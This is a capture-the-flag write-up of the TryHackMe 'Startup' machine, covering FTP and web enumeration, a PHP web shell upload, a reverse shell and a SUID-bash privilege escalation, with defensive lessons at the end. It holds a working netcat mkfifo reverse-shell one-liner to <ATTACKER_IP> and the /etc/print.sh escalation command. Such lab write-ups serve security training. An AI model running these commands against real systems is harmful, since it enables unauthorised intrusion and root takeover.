# TryHackMe - Startup Writeup

## Overview

Startup is a beginner-friendly Linux machine that focuses on enumeration, web exploitation, packet analysis, credential harvesting, and privilege escalation. The attack chain begins with anonymous FTP access and ends with root access through a misconfigured root-executed script.

## Reconnaissance

### Nmap Scan

The first step was to identify the exposed services running on the target machine.

```bash
nmap -sC -sV <TARGET_IP>
```

**Figure 1: Nmap scan results**

[INSERT NMAP SCREENSHOT]

The scan revealed three interesting services:

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

The FTP service immediately stood out because anonymous authentication was enabled.

---

## FTP Enumeration

I connected to the FTP server using anonymous credentials.

```bash
ftp <TARGET_IP>
```

**Figure 2: Anonymous FTP Login**

[INSERT FTP SCREENSHOT]

Listing the contents of the FTP server revealed several files and a writable FTP directory.

Since write access was available, this became a promising avenue for obtaining code execution.

---

## Web Enumeration

Next, I investigated the web application running on port 80.

The landing page did not reveal any obvious functionality, so directory enumeration was performed using Gobuster.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt
```

**Figure 3: Gobuster Enumeration**

[INSERT GOBUSTER SCREENSHOT]

The scan revealed a hidden directory:

```text
/files
```

Visiting the directory exposed the same files that were accessible through FTP.

**Figure 4: Exposed /files Directory**

[INSERT FILES DIRECTORY SCREENSHOT]

This confirmed that files uploaded through FTP could be accessed directly from the web server.

---

## Initial Access

### Uploading a Web Shell

Because the FTP directory was writable and web-accessible, I uploaded a PHP web shell (phpbash.php).

After uploading the file, I navigated to:

```text
http://<TARGET_IP>/files/ftp/phpbash.php
```

**Figure 5: Uploaded PHP Web Shell**

[INSERT PHPBASH UPLOAD SCREENSHOT]

The page successfully executed commands, confirming remote code execution as the web server user.

---

### Obtaining a Reverse Shell

While the web shell allowed command execution, an interactive shell would make post-exploitation significantly easier.

A Netcat listener was started on the attack machine:

```bash
nc -lvnp 4242
```

A reverse shell payload was then executed through the web shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4242 >/tmp/f
```

**Figure 6: Reverse Shell Established**

[INSERT REVERSE SHELL SCREENSHOT]

A successful connection was received, providing a shell as the www-data user.

```text
uid=33(www-data)
```

---

## Post Exploitation

### System Enumeration

With shell access established, I began enumerating the system.

During enumeration, an interesting file was discovered in the root directory.

```text
/recipe.txt
```

**Figure 7: Discovery of recipe.txt**

[INSERT RECIPE SCREENSHOT]

The file contained the answer to the first room question.

---

### Discovery of Network Capture

Further enumeration revealed a directory named:

```text
/incidents
```

The directory was owned by www-data and contained a packet capture file.

```text
suspicious.pcapng
```

**Figure 8: Discovery of suspicious.pcapng**

[INSERT INCIDENTS SCREENSHOT]

To retrieve the file, it was moved into the FTP directory where it could be downloaded through the web interface.

---

## Credential Harvesting

The packet capture was opened in Wireshark for analysis.

Inspecting the TCP streams revealed credentials being transmitted.

**Figure 9: Credential Discovery in Wireshark**

[INSERT WIRESHARK SCREENSHOT]

The capture exposed Lennie's password.

This provided a new path for accessing the system through SSH.

---

## User Access

Using the recovered credentials, SSH access was obtained.

```bash
ssh lennie@<TARGET_IP>
```

**Figure 10: SSH Access as Lennie**

[INSERT SSH SCREENSHOT]

After logging in, the user flag was retrieved successfully.

```bash
cat user.txt
```

---

## Privilege Escalation

### Investigating Scripts

Inside Lennie's home directory, a scripts folder was identified.

A file named:

```text
planner.sh
```

was owned by root but could be read and executed.

Inspecting the script revealed:

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

**Figure 11: planner.sh Analysis**

[INSERT PLANNER SCREENSHOT]

The script executed `/etc/print.sh`.

Further inspection showed that `print.sh` was writable by the current user.

This represented a privilege escalation opportunity because the script was executed by a root-owned process.

---

### Exploiting print.sh

I modified the script to create a SUID-enabled copy of Bash.

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' >> /etc/print.sh
```

After modifying the script, I executed:

```bash
./planner.sh
```

**Figure 12: SUID Bash Creation**

[INSERT ROOTBASH SCREENSHOT]

A new binary appeared in `/tmp`.

```text
/tmp/rootbash
```

---

### Root Access

The first attempt to execute the binary failed to provide root privileges.

```bash
./rootbash
```

**Figure 13: Initial Failure**

[INSERT FAILED ROOT SCREENSHOT]

After further investigation, I realized that Bash must be executed with the `-p` flag to preserve elevated privileges.

```bash
./rootbash -p
```

The command successfully spawned a root shell.

```text
uid=0(root)
```

**Figure 14: Root Shell**

[INSERT ROOT FLAG SCREENSHOT]

The root flag was then retrieved successfully.

---

## Attack Path Summary

1. Anonymous FTP access discovered.
2. Writable FTP share identified.
3. PHP web shell uploaded.
4. Remote code execution obtained as www-data.
5. Reverse shell established.
6. Packet capture discovered and analyzed.
7. Lennie's credentials recovered.
8. SSH access gained.
9. Writable root-executed script identified.
10. SUID Bash created through script abuse.
11. Root shell obtained.

## Lessons Learned

This room demonstrates the importance of:

* Restricting anonymous FTP access.
* Preventing writable web-accessible directories.
* Avoiding plaintext credential exposure in network traffic.
* Properly securing scripts executed by privileged users.
* Auditing file permissions regularly to prevent privilege escalation paths.

The compromise of this machine was achieved through a chain of small misconfigurations that ultimately resulted in full system compromise.

